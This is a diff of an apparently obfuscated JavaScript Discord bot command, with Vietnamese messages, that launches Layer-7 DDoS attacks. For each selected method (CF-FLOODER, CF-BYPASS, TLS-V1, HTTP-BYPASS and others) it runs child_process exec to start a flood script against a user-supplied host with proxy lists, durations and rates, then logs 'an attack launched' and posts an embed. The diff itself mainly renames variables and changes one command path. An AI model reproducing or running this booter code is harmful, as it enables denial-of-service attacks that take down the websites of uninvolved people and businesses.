@@ -94,11 +94,11 @@ module['exports'] = {
             })
         };
         const _0xf396x9 = _0xf396x8['options']['getString']('methods');
-        const _website = _0xf396x8['options']['getString']('host');
+        const website = _0xf396x8['options']['getString']('host');
         if (_0xf396x9 === 'VIP-KID') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node methods/L7/'}${_method}${'.js GET '}${_website}${' http.txt 120 120 3'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node methods/L7/'}${method}${'.js GET '}${website}${' http.txt 120 120 3'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -106,7 +106,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
@@ -138,9 +138,9 @@ module['exports'] = {
             })
         };
             if (_0xf396x9 === 'VIP-JXE') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node methods/L7/'}${_method}${'.js '}${_website}${' 60 10'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node methods/L7/'}${method}${'.js '}${website}${' 60 10'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -148,7 +148,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
@@ -180,9 +180,9 @@ module['exports'] = {
             })
         };
             if (_0xf396x9 === 'HTTP-BROWSER') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node methods/L7/'}${_method}${'.js '}${_website}${' 10 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node methods/L7/'}${method}${'.js '}${website}${' 10 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -190,7 +190,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
@@ -222,9 +222,9 @@ module['exports'] = {
             })
         };
         if (_0xf396x9 === 'HOAN-V1') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node methods/L7/'}${_method}${'.js GET '}${_website}${' http.txt 60 150 9 cookie="" referer="http://www.google.com/?q=" useragent="Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" headerdata="" randomstring="sKCx49VgtHZ59bJOTLcU0Gr06ogUnDJi"'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node methods/L7/'}${method}${'.js GET '}${website}${' http.txt 60 150 9 cookie="" referer="http://www.google.com/?q=" useragent="Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" headerdata="" randomstring="sKCx49VgtHZ59bJOTLcU0Gr06ogUnDJi"'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -232,7 +232,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
@@ -264,9 +264,9 @@ module['exports'] = {
             })
         };
         if (_0xf396x9 === 'HOAN-V2') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node methods/L7/'}${_method}${'.js '}${_website}${' 120 20 http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node methods/L7/'}${method}${'.js '}${website}${' 120 20 http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -274,7 +274,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
@@ -306,9 +306,9 @@ module['exports'] = {
             })
         };
         if (_0xf396x9 === 'HTTP-JUBI') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node methods/L7/'}${_method}${'.js '}${_website}${' 60 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node methods/L7/'}${method}${'.js '}${website}${' 60 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -316,7 +316,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
@@ -348,9 +348,9 @@ module['exports'] = {
             })
         };
         if (_0xf396x9 === 'CF-FLOODER') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node methods/L7/'}${_method}${'.js GET '}${_website}${' http.txt 60 120 3'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node methods/L7/'}${method}${'.js GET '}${website}${' http.txt 60 120 3'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -358,7 +358,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
@@ -390,9 +390,9 @@ module['exports'] = {
             })
         };
         if (_0xf396x9 === 'CF-BYPASS') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node methods/L7/'}${_method}${'.js '}${_website}${' 120 30 http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd vip && cd L7 && ${'node '}${method}${'.js '}${website}${' 120 100 http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -400,7 +400,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
@@ -432,9 +432,9 @@ module['exports'] = {
             })
         };
         if (_0xf396x9 === 'CF-TLS') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node methods/L7/'}${_method}${'.js '}${_website}${' 120 10 http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node methods/L7/'}${method}${'.js '}${website}${' 120 10 http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -442,7 +442,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
@@ -474,9 +474,9 @@ module['exports'] = {
             })
         };
         if (_0xf396x9 === 'CF-UAM') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node methods/L7/'}${_method}${'.js GET '}${_website}${' http.txt 60 64 1'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node methods/L7/'}${method}${'.js GET '}${website}${' http.txt 60 64 1'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -484,7 +484,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
@@ -516,9 +516,9 @@ module['exports'] = {
             })
         };
         if (_0xf396x9 === 'TLS-V1') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node methods/L7/'}${_method}${'.js '}${_website}${' 60 5 120 http.txt GET'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node methods/L7/'}${method}${'.js '}${website}${' 60 5 120 http.txt GET'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -526,7 +526,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
@@ -558,9 +558,9 @@ module['exports'] = {
             })
         };
         if (_0xf396x9 === 'HTTP-BYPASS') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node methods/L7/'}${_method}${'.js '}${_website}${' 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node methods/L7/'}${method}${'.js '}${website}${' 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -568,7 +568,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
@@ -600,9 +600,9 @@ module['exports'] = {
             })
         };
         if (_0xf396x9 === 'HTTP-SAN') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node methods/L7/'}${_method}${'.js '}${_website}${' 60 5 GET http.txt 120'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node methods/L7/'}${method}${'.js '}${website}${' 60 5 GET http.txt 120'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -610,7 +610,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
@@ -642,9 +642,9 @@ module['exports'] = {
             })
         };
         if (_0xf396x9 === 'HTTP-ONII') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node methods/L7/'}${_method}${'.js '}${_website}${' 60 http.txt 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node methods/L7/'}${method}${'.js '}${website}${' 60 http.txt 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -652,7 +652,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
@@ -684,9 +684,9 @@ module['exports'] = {
             })
         };
         if (_0xf396x9 === 'TLS-V2') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node methods/L7/'}${_method}${'.js '}${_website}${' 60 120 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node methods/L7/'}${method}${'.js '}${website}${' 60 120 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -694,7 +694,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
